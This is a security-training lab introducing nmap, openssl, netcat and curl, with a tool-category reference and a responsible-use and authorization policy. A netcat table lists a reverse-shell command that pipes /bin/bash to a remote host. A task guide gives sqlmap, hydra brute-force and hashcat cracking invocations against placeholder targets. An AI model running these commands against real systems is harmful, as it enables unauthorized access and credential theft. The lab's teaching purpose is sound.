# Lab 19: Security Tools Overview

## 🎯 Objective
Get hands-on experience with essential security tools (nmap, openssl, netcat, curl), understand tool categories, and internalize responsible use policy.

## 📚 Background
The security field relies on a rich ecosystem of tools spanning network scanning, vulnerability assessment, password testing, network analysis, and forensics. Many of these tools are dual-use — legitimately used by security professionals for defense and by attackers for offense. Understanding which tool does what, and when it's appropriate to use it, is fundamental to security work.

The security toolbox can be broadly categorized: reconnaissance tools (nmap, theHarvester, Shodan) gather information about targets; web application tools (Burp Suite, nikto, sqlmap) test web security; password tools (hashcat, John the Ripper, hydra) assess authentication; network tools (Wireshark, tcpdump, netcat) analyze traffic; and forensics tools (Volatility, Autopsy, Sleuth Kit) investigate compromises.

Responsible use means using these tools only on systems you own or have explicit written authorization to test. Unauthorized scanning, exploitation, or interception is illegal under computer fraud laws in virtually every jurisdiction. Professional penetration testers operate under formal agreements (scopes of work, rules of engagement) that define exactly what is and isn't permitted.

## ⏱️ Estimated Time
35 minutes

## 📋 Prerequisites
- Completion of previous foundation labs (general familiarity)

## 🛠️ Tools Used
- `nmap` — network scanner
- `openssl` — cryptographic toolkit
- `nc` (netcat) — network utility
- `curl` — HTTP client
- `python3` — scripting

## 🔬 Lab Instructions

### Step 1: nmap — Network Discovery and Port Scanning

```bash
echo "=== nmap: The Network Mapper ==="
nmap --version | head -2

echo ""
echo "=== Quick scan of localhost ==="
nmap -F localhost

echo ""
echo "=== Service version detection ==="
nmap -sV -p 22 localhost

echo ""
echo "=== nmap output formats ==="
echo "  -oN file.txt    Normal text output"
echo "  -oX file.xml    XML output (machine-parseable)"
echo "  -oG file.gnmap  Grepable output"
echo "  -oA basename    All formats simultaneously"

echo ""
echo "=== Common nmap scan types ==="
python3 << 'PYEOF'
scans = {
    "nmap -sn 192.168.1.0/24": "Ping sweep - find live hosts (no port scan)",
    "nmap -F target": "Fast scan - top 100 ports",
    "nmap -sV -sC target": "Version + script scan",
    "nmap -A target": "Aggressive: -sV -sC -O + traceroute",
    "nmap -p 1-65535 target": "All ports scan (slow but complete)",
    "nmap --script vuln target": "Vulnerability scanning scripts",
}
print("Common nmap invocations:")
for cmd, desc in scans.items():
    print(f"  {cmd}")
    print(f"    → {desc}")
    print()
PYEOF
```

**📸 Verified Output:**
```
=== nmap: The Network Mapper ===
Nmap 7.80 ( https://nmap.org )

=== Quick scan of localhost ===
PORT   STATE SERVICE
22/tcp open  ssh
Nmap done: 1 IP address scanned in 0.05 seconds

=== Service version detection ===
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
```

> 💡 **What this means:** nmap is the foundation of network reconnaissance. Defenders use it to audit their own networks; attackers use it for target profiling. Always get written authorization before scanning any network that isn't yours.

### Step 2: openssl — Cryptographic Swiss Army Knife

```bash
echo "=== openssl: Cryptographic Toolkit ==="
openssl version

echo ""
echo "=== Generate random data ==="
openssl rand -hex 32

echo ""
echo "=== Hash a string ==="
echo -n "Hello, Security!" | openssl dgst -sha256
echo -n "Hello, Security!" | openssl dgst -sha512 | head -c 80
echo ""

echo ""
echo "=== Generate RSA key pair ==="
openssl genrsa -out /tmp/demo.key 2048 2>/dev/null
openssl rsa -in /tmp/demo.key -pubout -out /tmp/demo.pub 2>/dev/null
echo "Key generated: $(wc -c < /tmp/demo.key) bytes"
echo "Public key:    $(wc -c < /tmp/demo.pub) bytes"

echo ""
echo "=== Inspect a TLS connection ==="
echo | openssl s_client -connect google.com:443 -servername google.com 2>/dev/null \
  | openssl x509 -noout -subject -issuer 2>/dev/null \
  || echo "(TLS inspection - requires network)"

echo ""
echo "=== Encrypt/decrypt a file ==="
echo "sensitive data" > /tmp/plaintext.txt
openssl enc -aes-256-cbc -k secretkey -in /tmp/plaintext.txt -out /tmp/encrypted.bin -pbkdf2 2>/dev/null
openssl enc -aes-256-cbc -d -k secretkey -in /tmp/encrypted.bin -pbkdf2 2>/dev/null
rm -f /tmp/plaintext.txt /tmp/encrypted.bin /tmp/demo.key /tmp/demo.pub

echo ""
echo "openssl use cases:"
python3 << 'PYEOF'
uses = [
    "Key generation (RSA, EC, Ed25519)",
    "Certificate operations (create, sign, inspect)",
    "TLS/SSL testing and inspection",
    "Symmetric encryption (AES-256)",
    "Hashing (SHA-256, SHA-512, MD5)",
    "Random number/token generation",
    "Digital signatures (sign and verify)",
    "Certificate chain verification",
]
for use in uses:
    print(f"  ✓ {use}")
PYEOF
```

**📸 Verified Output:**
```
=== openssl: Cryptographic Toolkit ===
OpenSSL 3.0.2 15 Mar 2022

=== Generate random data ===
a3f8c2d1e4b5...

=== Hash a string ===
SHA2-256(stdin)= 4a5c8f2d...

=== Generate RSA key pair ===
Key generated: 1704 bytes
Public key:    451 bytes
```

> 💡 **What this means:** openssl is the most comprehensive cryptographic toolkit available in Linux. It's used in everything from generating TLS certificates to testing SSH key algorithms. Learning openssl basics is essential for any security professional.

### Step 3: netcat — Network Swiss Army Knife

```bash
echo "=== netcat: Universal Network Tool ==="
nc --version 2>/dev/null | head -2 || echo "netcat available"

echo ""
echo "=== nc: Test port connectivity ==="
nc -zv localhost 22 2>&1

echo ""
echo "=== nc: Simple server-client demo ==="
# Start listener in background
nc -l -p 9999 > /tmp/nc_output.txt &
NC_PID=$!
sleep 0.5

# Send message
echo "Connection test successful" | nc -q 1 localhost 9999 2>/dev/null || \
echo "Connection test successful" | nc localhost 9999
sleep 0.5
kill $NC_PID 2>/dev/null
cat /tmp/nc_output.txt
rm -f /tmp/nc_output.txt

echo ""
echo "=== nc use cases ==="
python3 << 'PYEOF'
uses = {
    "Port scanning": "nc -zv host 80-443 (test port range)",
    "Simple file transfer": "nc -l 1234 > file.txt  /  nc host 1234 < file.txt",
    "Chat server": "nc -l 1234  /  nc host 1234 (type messages)",
    "Reverse shell (attack tool)": "nc -l 4444  /  nc host 4444 -e /bin/bash",
    "Proxy connections": "nc -l 8080 | nc actual-server 80",
    "Banner grabbing": "nc target 22  (see SSH version)",
    "Testing firewall rules": "nc -zv host port  (open/closed test)",
    "HTTP requests": "echo 'GET / HTTP/1.0' | nc webserver 80",
}
print("netcat use cases:")
for use, example in uses.items():
    print(f"\n  [{use}]")
    print(f"  {example}")
PYEOF
```

**📸 Verified Output:**
```
=== netcat: Universal Network Tool ===
nc (netcat) 1.218 (Ubuntu)

=== nc: Test port connectivity ===
Connection to localhost (127.0.0.1) 22 port [tcp/ssh] succeeded!

=== nc: Simple server-client demo ===
Connection test successful
```

> 💡 **What this means:** netcat is called the "TCP/IP Swiss Army knife" — it can do almost anything with TCP/UDP connections. It's legitimately used by admins for testing and troubleshooting. The reverse shell use case (`-e /bin/bash`) is why administrators should monitor for nc with unusual flags in process lists.

### Step 4: curl — HTTP Testing Tool

```bash
echo "=== curl: Client URL tool ==="
curl --version | head -2

echo ""
echo "=== Basic HTTP request ==="
curl -s http://example.com | head -5

echo ""
echo "=== Headers only ==="
curl -I http://example.com 2>/dev/null | head -10

echo ""
echo "=== POST request (simulating form submission) ==="
curl -s -X POST https://httpbin.org/post \
  -H "Content-Type: application/json" \
  -d '{"username":"test","action":"login"}' 2>/dev/null \
  | python3 -m json.tool 2>/dev/null | head -15 || echo "(POST request demo)"

echo ""
echo "=== Follow redirects and show final URL ==="
curl -L -s -o /dev/null -w "%{url_effective}\n%{http_code}\n" http://google.com 2>/dev/null

echo ""
echo "=== Custom headers (authentication example) ==="
curl -s -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -H "X-Custom-Header: SecurityTest" \
  http://example.com 2>/dev/null -o /dev/null -w "Status: %{http_code}\n"

echo ""
echo "=== curl use cases ==="
python3 << 'PYEOF'
uses = {
    "API testing": "curl -X POST api.example.com/login -d '{\"user\":\"test\"}'",
    "Security header check": "curl -I https://example.com  (check response headers)",
    "SSL/TLS testing": "curl -k https://self-signed.example.com  (-k = ignore cert)",
    "Custom user agents": "curl -A 'Mozilla/5.0' https://example.com",
    "Cookie handling": "curl -c cookies.txt -b cookies.txt https://app.example.com",
    "Follow redirects": "curl -L http://example.com  (follow 301/302 redirects)",
    "File download": "curl -O https://example.com/file.zip",
    "Proxy routing": "curl -x http://proxy:8080 https://example.com",
    "Rate checking": "curl -o /dev/null -w '%{time_total}' https://example.com",
    "mTLS (client cert)": "curl --cert client.crt --key client.key https://mtls-app.com",
}
print("curl use cases:")
for use, example in uses.items():
    print(f"\n  [{use}]")
    print(f"  {example}")
PYEOF
```

**📸 Verified Output:**
```
=== curl: Client URL tool ===
curl 7.81.0 (x86_64-pc-linux-gnu)

=== Basic HTTP request ===
<!doctype html>
<html>
<head>
    <title>Example Domain</title>

=== Headers only ===
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
```

> 💡 **What this means:** curl is the most versatile HTTP client for security testing. It can replicate virtually any HTTP request, making it ideal for testing APIs, checking security headers, and debugging web application behavior.

### Step 5: Security Tool Categories Reference

```bash
python3 << 'EOF'
print("SECURITY TOOL ECOSYSTEM OVERVIEW")
print("=" * 70)

categories = {
    "Reconnaissance & OSINT": {
        "description": "Gathering information about targets",
        "tools": [
            ("nmap", "Network scanner, port/service discovery"),
            ("theHarvester", "Email, subdomain, IP gathering from public sources"),
            ("Shodan", "Search engine for internet-connected devices"),
            ("Maltego", "Link analysis and data visualization"),
            ("WHOIS/dig", "Domain registration and DNS information"),
            ("Recon-ng", "Web reconnaissance framework"),
        ]
    },
    "Web Application Testing": {
        "description": "Testing web application security",
        "tools": [
            ("Burp Suite", "Intercepting proxy, scanner, spider for web apps"),
            ("OWASP ZAP", "Open-source web application scanner"),
            ("nikto", "Web server vulnerability scanner"),
            ("sqlmap", "Automated SQL injection testing"),
            ("gobuster/ffuf", "Directory and file brute forcing"),
            ("wfuzz", "Web application fuzzer"),
        ]
    },
    "Password & Authentication": {
        "description": "Testing password strength and authentication",
        "tools": [
            ("hashcat", "GPU-accelerated password cracking"),
            ("John the Ripper", "Password cracking suite"),
            ("hydra", "Network login brute forcer"),
            ("Medusa", "Parallel brute force tool"),
            ("CeWL", "Custom wordlist generator from websites"),
            ("crunch", "Wordlist generator"),
        ]
    },
    "Network Analysis": {
        "description": "Capturing and analyzing network traffic",
        "tools": [
            ("Wireshark", "GUI network protocol analyzer"),
            ("tcpdump", "Command-line packet capture"),
            ("netcat (nc)", "Generic network utility"),
            ("Zeek/Bro", "Network traffic analysis framework"),
            ("Suricata", "IDS/IPS/NSM engine"),
            ("NetworkMiner", "Network forensic analyzer"),
        ]
    },
    "Exploitation": {
        "description": "Testing exploitability of vulnerabilities",
        "tools": [
            ("Metasploit", "Exploitation framework"),
            ("BeEF", "Browser exploitation framework"),
            ("SQLmap", "SQL injection exploitation"),
            ("Exploit-DB", "Database of public exploits"),
            ("Cobalt Strike", "Commercial adversary simulation"),
            ("PowerSploit", "PowerShell post-exploitation"),
        ]
    },
    "Forensics & IR": {
        "description": "Investigating compromises and analyzing artifacts",
        "tools": [
            ("Volatility", "Memory forensics framework"),
            ("Autopsy/Sleuth Kit", "Disk forensics suite"),
            ("YARA", "Malware pattern matching"),
            ("FTK Imager", "Forensic disk imaging"),
            ("Rekall", "Memory forensics"),
            ("OSQuery", "SQL-based endpoint interrogation"),
        ]
    },
    "Cryptographic Tools": {
        "description": "Cryptography operations and testing",
        "tools": [
            ("openssl", "Comprehensive cryptographic toolkit"),
            ("GPG", "Email encryption and file signing"),
            ("hashcat", "Hash cracking (also crypto category)"),
            ("CyberChef", "Data encoding/decoding operations"),
            ("Aircrack-ng", "WiFi WEP/WPA cracking suite"),
            ("sslyze", "SSL/TLS configuration analyzer"),
        ]
    },
}

for category, info in categories.items():
    print(f"\n[{category}]")
    print(f"  Purpose: {info['description']}")
    for tool, desc in info['tools'][:4]:
        print(f"    • {tool:<20} {desc}")
EOF
```

**📸 Verified Output:**
```
SECURITY TOOL ECOSYSTEM OVERVIEW
======================================================================

[Reconnaissance & OSINT]
  Purpose: Gathering information about targets
    • nmap                 Network scanner, port/service discovery
    • theHarvester         Email, subdomain, IP gathering from public sources
    • Shodan               Search engine for internet-connected devices

[Web Application Testing]
  Purpose: Testing web application security
    • Burp Suite           Intercepting proxy, scanner, spider for web apps
    • OWASP ZAP            Open-source web application scanner
...
```

> 💡 **What this means:** Security tools are specialized for different phases of security testing. Professionals need familiarity with tools across all categories. Many are open source; some (Burp Suite Pro, Cobalt Strike) require licenses. The Kali Linux distribution includes most of these pre-installed.

### Step 6: Responsible Use Policy

```bash
python3 << 'EOF'
print("RESPONSIBLE USE POLICY FOR SECURITY TOOLS")
print("=" * 65)

print("""
LEGAL FRAMEWORK
───────────────
Security tools are legal to possess and use. The legality depends entirely
on WHAT YOU DO WITH THEM and WHOSE SYSTEMS YOU TARGET.

ALWAYS LEGAL:
  ✅ Testing systems you own
  ✅ Authorized penetration testing with signed scope document
  ✅ Running tools in lab environments (VMs, Hack The Box, TryHackMe)
  ✅ Security research following responsible disclosure
  ✅ Defensive use (scanning your own network, auditing your own certs)

POTENTIALLY ILLEGAL (jurisdiction varies):
  ⚠️  Scanning networks you don't own without permission
      (Even passive scanning can be illegal in some countries)
  
  ⚠️  Probing systems for vulnerabilities without authorization
      (Many computer crime laws make unauthorized probing illegal)

CLEARLY ILLEGAL:
  ❌ Exploiting vulnerabilities in systems you don't own
  ❌ Intercepting network traffic without authorization
  ❌ Accessing computer systems without authorization
  ❌ Deploying malware (even 'educational' samples)
  ❌ Scanning/attacking others' systems 'just to see'

RELEVANT LAWS:
  • USA: Computer Fraud and Abuse Act (CFAA)
  • UK: Computer Misuse Act 1990
  • EU: Directive on Attacks Against Information Systems
  • Canada: Criminal Code Section 342.1
  • Australia: Cybercrime Act 2001
""")

print("""
PROFESSIONAL PENTEST AUTHORIZATION REQUIREMENTS
────────────────────────────────────────────────
Before touching any external system:

1. SCOPE DOCUMENT
   - Exact IP ranges/domains in scope
   - Excluded systems (always exclude)
   - Permitted attack types (social engineering? physical?)
   - Time window for testing
   
2. AUTHORIZATION LETTER
   - Signed by C-level executive (not just IT manager)
   - Should survive a police encounter
   - Also called "Get Out of Jail Letter"
   
3. RULES OF ENGAGEMENT
   - No DoS against production systems
   - No data exfiltration (don't take real data)
   - No actions with lasting business impact
   - Emergency contact procedure
   
4. EMERGENCY CONTACTS
   - Who to call if we discover an active breach?
   - Who to call if we accidentally take down a system?
   
5. REPORTING OBLIGATIONS
   - When/how to report findings
   - Handling of sensitive data found
   - Notification of critical findings immediately
""")

print("""
ETHICAL GUIDELINES
──────────────────
Even within authorized testing:

  • Do not access/exfiltrate actual user data
  • Do not use access beyond what's needed for the test
  • Notify client immediately if you discover active attackers
  • Respect confidentiality of findings
  • Store report and evidence securely
  • Provide value: findings should help the client, not just prove skill
  • Follow responsible disclosure for public vulnerabilities found

CERTIFICATION AND EDUCATION (legal sandboxes):
  ✅ HackTheBox.eu         — Legal vulnerable machines for practice
  ✅ TryHackMe.com         — Guided security learning platform
  ✅ VulnHub.com           — Vulnerable VMs for download
  ✅ OWASP WebGoat         — Intentionally vulnerable web app
  ✅ DVWA                  — Damn Vulnerable Web Application
  ✅ PicoCTF               — Capture the Flag for learning
  ✅ Over The Wire         — Wargames (Bandit, Natas, etc.)
""")
EOF
```

**📸 Verified Output:**
```
RESPONSIBLE USE POLICY FOR SECURITY TOOLS
=================================================================

LEGAL FRAMEWORK
───────────────
ALWAYS LEGAL:
  ✅ Testing systems you own
  ✅ Authorized penetration testing with signed scope document
  ✅ Running tools in lab environments (VMs, Hack The Box, TryHackMe)

CLEARLY ILLEGAL:
  ❌ Exploiting vulnerabilities in systems you don't own
  ❌ Intercepting network traffic without authorization

CERTIFICATION AND EDUCATION (legal sandboxes):
  ✅ HackTheBox.eu         — Legal vulnerable machines for practice
  ✅ TryHackMe.com         — Guided security learning platform
```

> 💡 **What this means:** "I was just learning" is not a legal defense. Use HackTheBox, TryHackMe, and local VMs for practice. Save tool use on real networks for professional engagements with proper authorization. The authorization documentation protects you legally.

### Step 7: Tool Selection Guide

```bash
python3 << 'EOF'
print("TOOL SELECTION GUIDE BY TASK")
print("=" * 65)

tasks = {
    "I want to find all open ports on a server": {
        "tool": "nmap",
        "command": "nmap -sV -sC target.host",
        "alternative": "masscan (faster for large networks)"
    },
    "I want to test if a web server is vulnerable": {
        "tool": "nikto + OWASP ZAP",
        "command": "nikto -h http://target.host",
        "alternative": "Burp Suite (manual) or Acunetix (commercial)"
    },
    "I want to test for SQL injection": {
        "tool": "sqlmap (authorized testing only)",
        "command": "sqlmap -u 'http://target.host/page?id=1'",
        "alternative": "Manual testing with Burp Suite"
    },
    "I want to crack password hashes": {
        "tool": "hashcat",
        "command": "hashcat -m 0 hashes.txt wordlist.txt (MD5)",
        "alternative": "John the Ripper (john hashes.txt)"
    },
    "I want to brute-force a login page": {
        "tool": "hydra (authorized testing only)",
        "command": "hydra -l admin -P wordlist.txt http-post-form target.host/login",
        "alternative": "Burp Suite Intruder"
    },
    "I want to capture network traffic": {
        "tool": "tcpdump or Wireshark",
        "command": "tcpdump -i eth0 -w capture.pcap",
        "alternative": "Wireshark GUI (easier analysis)"
    },
    "I want to test SSL/TLS configuration": {
        "tool": "openssl + sslyze",
        "command": "openssl s_client -connect host:443 | openssl x509 -text",
        "alternative": "SSL Labs online scanner (qualys)"
    },
    "I want to analyze malware": {
        "tool": "strings + Ghidra + Cuckoo sandbox",
        "command": "strings malware.exe | grep -E '(http|cmd|exe|dll)'",
        "alternative": "Any.run online sandbox (safe)"
    },
    "I want to do memory forensics": {
        "tool": "Volatility",
        "command": "volatility -f memory.dmp imageinfo",
        "alternative": "Rekall"
    },
    "I want to check HTTP security headers": {
        "tool": "curl",
        "command": "curl -I https://target.host",
        "alternative": "securityheaders.com (online)"
    },
}

for task, info in tasks.items():
    print(f"\n📋 Task: {task}")
    print(f"  → Tool:    {info['tool']}")
    print(f"  → Command: {info['command']}")
    print(f"  → Alt:     {info['alternative']}")
EOF
```

**📸 Verified Output:**
```
TOOL SELECTION GUIDE BY TASK
=================================================================

📋 Task: I want to find all open ports on a server
  → Tool:    nmap
  → Command: nmap -sV -sC target.host
  → Alt:     masscan (faster for large networks)

📋 Task: I want to test for SQL injection
  → Tool:    sqlmap (authorized testing only)
  → Command: sqlmap -u 'http://target.host/page?id=1'
```

> 💡 **What this means:** Having the right tool for the right task is a professional skill. Knowing which tool to reach for saves time and produces better results. Learn a few tools deeply rather than having shallow knowledge of many.

### Step 8: Building Your Security Lab

```bash
python3 << 'EOF'
print("BUILDING A HOME SECURITY LAB")
print("=" * 60)

lab_options = [
    {
        "option": "Online Platforms (Start Here)",
        "cost": "Free to ~$15/month",
        "pros": ["No hardware needed", "Legal", "Community support", "Guided paths"],
        "cons": ["Dependent on internet", "Limited to platform scenarios"],
        "resources": [
            "HackTheBox.eu (BEST for skill building)",
            "TryHackMe.com (beginner-friendly guided rooms)",
            "PicoCTF.com (free CTF challenges)",
            "OverTheWire.org (Linux fundamentals through wargames)",
            "OWASP WebGoat (web app vulnerabilities)",
        ]
    },
    {
        "option": "Local VM Lab (Recommended Step 2)",
        "cost": "$0-50 (VirtualBox is free)",
        "pros": ["Full control", "Offline", "Any scenario possible"],
        "cons": ["Requires hardware", "Setup time"],
        "resources": [
            "VirtualBox or VMware Workstation Player (free) for hypervisor",
            "Kali Linux VM (attacker machine)",
            "Ubuntu Server VM (target machine)",
            "Metasploitable2 VM (intentionally vulnerable target)",
            "OWASP BWA (vulnerable web apps collection)",
            "VulnHub.com (download vulnerable VMs)",
        ]
    },
    {
        "option": "Cloud Lab (Flexible)",
        "cost": "$20-100/month depending on usage",
        "pros": ["Accessible anywhere", "Scalable", "No hardware"],
        "cons": ["Cost", "Must configure networking carefully"],
        "resources": [
            "AWS Free Tier (EC2 instances for practice)",
            "Digital Ocean Droplets (cheap VMs)",
            "Proxmox on dedicated server (self-hosted hypervisor)",
            "Note: Never attack public internet from cloud lab!",
        ]
    },
]

for lab in lab_options:
    print(f"\n{'─'*60}")
    print(f"OPTION: {lab['option']}")
    print(f"Cost:   {lab['cost']}")
    print(f"Pros:   {', '.join(lab['pros'][:2])}")
    print(f"Resources:")
    for r in lab['resources'][:4]:
        print(f"  ✓ {r}")

print(f"\n{'='*60}")
print("RECOMMENDED LEARNING PATH:")
learning_path = [
    "1. TryHackMe - Complete 'Pre-Security' and 'SOC Level 1' paths",
    "2. OWASP WebGoat - Practice all web vulnerabilities locally",
    "3. HackTheBox - Start with 'Starting Point' machines",
    "4. Build local lab: Kali + Metasploitable2",
    "5. CTF competitions: PicoCTF, CTFtime.org events",
    "6. Certification study: CompTIA Security+, CEH, OSCP",
    "7. Bug bounty: HackerOne, Bugcrowd (with scope!)",
]
for step in learning_path:
    print(f"  {step}")
EOF
```

**📸 Verified Output:**
```
BUILDING A HOME SECURITY LAB
============================================================

──────────────────────────────────────────────────────────────────
OPTION: Online Platforms (Start Here)
Cost:   Free to ~$15/month
Resources:
  ✓ HackTheBox.eu (BEST for skill building)
  ✓ TryHackMe.com (beginner-friendly guided rooms)

RECOMMENDED LEARNING PATH:
  1. TryHackMe - Complete 'Pre-Security' and 'SOC Level 1' paths
  2. OWASP WebGoat - Practice all web vulnerabilities locally
```

> 💡 **What this means:** You don't need expensive equipment to learn security. Start with free online platforms, progress to local VMs, and only venture to cloud labs once you understand networking well enough to isolate your experiments properly.

## ✅ Verification

```bash
echo "=== Tool Availability Check ==="
nmap --version | head -1 && echo "✅ nmap"
openssl version && echo "✅ openssl"
nc --version 2>/dev/null | head -1 && echo "✅ netcat"
curl --version | head -1 && echo "✅ curl"
python3 --version && echo "✅ python3"
echo "Security tools overview lab verified"
```

## 🚨 Common Mistakes

- **Testing without authorization**: Always have written permission before testing any system you don't own
- **Scanning from cloud without isolation**: Cloud VMs can scan the internet — ensure you're not accidentally attacking real targets
- **Using production credentials in labs**: Never use real credentials in practice environments
- **Ignoring tool documentation**: Each tool has nuances; read the man pages and documentation
- **Skipping foundational knowledge**: Tools are only as effective as the knowledge behind them — understand the underlying protocols

## 📝 Summary

- **nmap** discovers hosts, open ports, services, and versions — the essential first step in security assessment
- **openssl** handles all cryptographic operations: key generation, certificates, hashing, encryption, TLS testing
- **netcat** provides raw TCP/UDP connectivity — useful for testing, simple file transfers, and connection debugging
- **curl** tests HTTP in detail: requests, headers, cookies, authentication — essential for web security testing
- **Responsible use** requires written authorization for any testing on non-owned systems — "educational purposes" is not a legal defense

## 🔗 Further Reading

- [HackTheBox Learning Platform](https://www.hackthebox.com/)
- [TryHackMe Beginner Path](https://tryhackme.com/)
- [Kali Linux Tool Documentation](https://www.kali.org/tools/)
- [nmap Book (Free Online)](https://nmap.org/book/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
